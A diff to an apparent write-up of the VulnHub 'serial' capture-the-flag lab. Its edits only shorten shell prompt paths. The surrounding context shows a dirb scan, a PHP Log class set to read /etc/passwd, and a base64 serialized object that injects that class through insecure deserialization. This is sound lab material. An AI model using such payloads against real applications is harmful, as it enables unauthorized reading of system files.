@@ -33,7 +33,7 @@ No exact OS matches for host (If you know what OS is running on it, see https://
 Dirb Results
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:~/vulnhub/serial# dirb http://192.168.56.107
+root@setrus:~# dirb http://192.168.56.107
 
 -----------------
 DIRB v2.22    
@@ -144,7 +144,7 @@ echo base64_encode(serialize(new User('setrus')));
 log.class.php
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:~/vulnhub/serial# cat log.class.php 
+root@setrus:~# cat log.class.php 
 <?php
   class Log {
     private $type_log="/etc/passwd";
@@ -166,7 +166,7 @@ root@setrus:~/vulnhub/serial# cat log.class.php
 Testing serialization
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:~/vulnhub/serial# php user.class.php
+root@setrus:~# php user.class.php
 LOG: setrusTzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjY6InNldHJ1cyI7czo5OiIAVXNlcgB3ZWwiO086MzoiTG9nIjoxOntzOjEzOiIATG9nAHR5cGVfbG9nIjtzOjExOiIvZXRjL3Bhc3N3ZCI7fX0=
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
@@ -191,7 +191,7 @@ root@setrus:~#
 Modifying the log.class.php
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:~/vulnhub/serial# cat log.class.php 
+root@setrus:~/# cat log.class.php 
 <?php
   class Log {
    // private $type_log="/etc/passwd";
